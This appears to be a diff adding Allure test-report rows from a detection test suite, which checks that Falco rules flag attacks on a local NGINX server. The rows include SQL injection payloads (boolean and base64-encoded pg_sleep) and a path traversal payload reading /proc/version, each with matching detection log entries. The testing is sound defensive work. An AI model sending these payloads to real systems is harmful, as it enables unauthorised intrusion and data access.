+| **Name** | Classic boolean injection |
+| **Category** | SQLI |
+| **Subcategory** | boolean_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `' OR '1'='1`
+- **Encoded**: `%27%20OR%20%271%27%3D%271`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~18000ms
+- **Timestamp**: 15:09:19.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_001-1765465759850-d97c9bi pattern_id=SQLI_BOOL_001 uri=/?q=%27%20OR%20%271%27%3D%271 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:19.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_001-1765465759850-d97c9bi pattern_id=SQLI_BOOL_001 uri=/?q=%27%20OR%20%271%27%3D%271 client=127.0.0.1 method=GET
+```","2","test_e2e_with_logs[001_SQLI_BOOL_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_DOT_007` |
+| **Name** | Kernel version access via traversal |
+| **Category** | PATH |
+| **Subcategory** | dot_dot_slash |
+| **Severity** | `MEDIUM` |
+
+## Attack Details
+
+- **Payload**: `../../../proc/version`
+- **Encoded**: `../../../proc/version`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~10000ms
+- **Timestamp**: 15:09:27.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_007-1765465767843-brtere pattern_id=PATH_DOT_007 uri=/?q=../../../proc/version client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:27.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_007-1765465767843-brtere pattern_id=PATH_DOT_007 uri=/?q=../../../proc/version client=127.0.0.1
+```","2","test_e2e_with_logs[067_PATH_DOT_007]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_009` |
+| **Name** | Base64 encoded pg_sleep(5) |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `cGdfc2xlZXAoNSk%3D`
+- **Encoded**: `cGdfc2xlZXAoNSk%253D`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~21000ms
+- **Timestamp**: 15:09:16.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_009-1765465756341-egoan9 pattern_id=SQLI_TIME_009 uri=/?q=cGdfc2xlZXAoNSk%253D client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:16.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_009-1765465756341-egoan9 pattern_id=SQLI_TIME_009 uri=/?q=cGdfc2xlZXAoNSk%253D client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[018_SQLI_TIME_009]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
